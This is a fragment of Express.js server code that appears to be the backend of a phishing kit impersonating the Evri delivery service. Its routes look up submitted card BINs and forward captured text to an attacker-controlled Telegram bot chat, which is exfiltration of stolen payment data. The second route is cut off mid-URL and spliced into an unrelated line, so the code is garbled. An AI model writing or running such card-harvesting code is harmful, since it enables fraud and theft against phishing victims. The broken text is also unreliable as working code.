...
app.post('/fpaysEvri', (req, res) => {
    ...
    axios.get(`https://lookup.binlist.net/${bin}`).then(resp => {
        ...
        if (fpaysC == 5) {
            ...
            axios.post(
                `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=1065375205&text=Evri:\n${originalText}`
            );
            fpaysC += 1;
        }
    })
...
app.post('/fpaysEvri2', (req, res) => {
    ...
    axios.get(`https://lookup.binlist.net/${bin}`).then(resp => {
        ...
        if (fpaysC == 5) {
            ...
            axios.post(
                `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=app.options('/fpaysEvri', cors())
